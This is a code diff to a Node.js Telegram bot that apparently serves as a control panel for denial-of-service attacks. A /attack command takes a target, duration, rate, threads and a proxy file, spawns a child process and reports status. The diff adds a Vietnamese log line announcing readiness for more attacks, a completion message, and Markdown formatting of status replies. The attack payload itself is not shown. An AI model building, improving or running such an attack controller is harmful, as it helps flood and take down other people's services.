@@ -11,6 +11,8 @@ const bot = new TelegramBot(token, { polling: true });
 
 let attacks = [];
 
+console.log('Bot đã hoạt động và sẵn sàng cho các cuộc tấn công tiếp theo');
+
 app.get('/', (req, res) => {
   res.json({ telegramAdmin: '@xkprj' });
 });
@@ -66,19 +68,20 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
       attacks = attacks.filter(a => a.id !== attackId);
       return;
     }
+    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`);
   });
   
   attackData.pid = child.pid;
   attacks.push(attackData);
   
-  bot.sendMessage(msg.chat.id, JSON.stringify({
+  bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
     status: attackData.status,
     target,
     time,
     rate,
     threads,
     proxyfile
-  }, null, 2)).then(sentMsg => {
+  }, null, 2) + '\n```', { parse_mode: 'Markdown' }).then(sentMsg => {
     attackData.messageId = sentMsg.message_id;
     
     setTimeout(() => {
@@ -92,16 +95,17 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
           attacks = attacks.filter(a => a.id !== attackId);
           return;
         }
-        bot.editMessageText(JSON.stringify({
+        bot.editMessageText('```json\n' + JSON.stringify({
           status: attackData.status,
           target,
           time: remainingTime,
           rate,
           threads,
           proxyfile
-        }, null, 2), {
+        }, null, 2) + '\n```', {
           chat_id: msg.chat.id,
-          message_id: attackData.messageId
+          message_id: attackData.messageId,
+          parse_mode: 'Markdown'
         }).catch(() => {
           clearInterval(interval);
           attacks = attacks.filter(a => a.id !== attackId);
